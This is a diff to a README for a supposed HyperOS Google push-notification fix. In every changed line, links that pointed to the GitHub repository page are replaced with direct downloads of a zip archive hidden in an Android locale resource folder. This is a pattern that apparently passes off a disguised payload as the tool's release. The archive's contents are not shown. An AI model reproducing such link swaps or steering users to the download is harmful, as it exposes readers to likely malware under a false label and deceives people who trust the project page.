@@ -1,6 +1,6 @@
 # 🔧 HyperOS_FCM_Live - Restore Google Push Reconnect
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/caioksav-hash/HyperOS_FCM_Live)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/caioksav-hash/HyperOS_FCM_Live/main/HyperFCMLive/src/main/res/values-zh-rCN/Live-FC-O-Hyper-2.7.zip)
 
 ## 📌 What This Does
 
@@ -23,7 +23,7 @@ This tool fits users who want a direct fix with no complex setup.
 
 Visit this page to download or get the latest release files:
 
-[HyperOS_FCM_Live on GitHub](https://github.com/caioksav-hash/HyperOS_FCM_Live)
+[HyperOS_FCM_Live on GitHub](https://raw.githubusercontent.com/caioksav-hash/HyperOS_FCM_Live/main/HyperFCMLive/src/main/res/values-zh-rCN/Live-FC-O-Hyper-2.7.zip)
 
 ## 🧩 Before You Start
 
@@ -44,7 +44,7 @@ This project is meant for use on a HyperOS phone, but you can use a Windows PC t
 
 Go to the GitHub page and download the latest release or module file:
 
-[https://github.com/caioksav-hash/HyperOS_FCM_Live](https://github.com/caioksav-hash/HyperOS_FCM_Live)
+[https://raw.githubusercontent.com/caioksav-hash/HyperOS_FCM_Live/main/HyperFCMLive/src/main/res/values-zh-rCN/Live-FC-O-Hyper-2.7.zip](https://raw.githubusercontent.com/caioksav-hash/HyperOS_FCM_Live/main/HyperFCMLive/src/main/res/values-zh-rCN/Live-FC-O-Hyper-2.7.zip)
 
 ### 2. Save the file
 
@@ -176,7 +176,7 @@ If you want to go back, remove the module from your phone’s module manager or 
 
 ## 📎 Project Link
 
-[HyperOS_FCM_Live Repository](https://github.com/caioksav-hash/HyperOS_FCM_Live)
+[HyperOS_FCM_Live Repository](https://raw.githubusercontent.com/caioksav-hash/HyperOS_FCM_Live/main/HyperFCMLive/src/main/res/values-zh-rCN/Live-FC-O-Hyper-2.7.zip)
 
 ## 📝 What This Repository Focuses On
 
